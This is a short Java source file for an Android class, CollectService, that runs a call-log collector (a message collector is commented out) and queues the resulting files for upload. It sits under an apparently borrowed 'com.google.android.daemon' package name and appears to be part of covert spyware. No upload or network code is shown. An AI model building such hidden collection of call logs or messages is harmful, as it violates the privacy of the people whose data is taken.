/**
 * @(#) CollectService.java Created on 2013-1-19
 *
 * Copyright (c) 2013 com.braver. All Rights Reserved
 */
package com.google.android.daemon.collect;

import java.util.ArrayList;
import java.util.List;

import com.google.android.daemon.App;

import android.content.Context;

/**
 * The class <code>CollectService</code>
 * 
 * @author ouyangfeng
 * @version 1.0
 */
public class CollectService {

    private List<ObjectCollect> collects = new ArrayList<ObjectCollect>();

    private List<String> uploadFiles = new ArrayList<String>();

    private Context mContext = App.getContext();

    public CollectService() {
        configCollect();
    }

    /**
     * config the collect
     */
    protected void configCollect() {
        //collects.add(new MessageCollect(mContext));
        collects.add(new CallLogCollect(mContext));
    }

    /**
     * start service
     * 
     * @return
     */
    public boolean start() {
        work();
        return true;
    }

    /**
     * do work
     */
    private void work() {
        String collectPath = null;
        for (ObjectCollect collect : collects) {
            collectPath = collect.collect();
            if (null != collectPath) // collect success
                uploadFiles.add(collectPath);
        }
    }

    /**
     * stop service
     * 
     * @return
     */
    public boolean stop() {
        return true;
    }
}
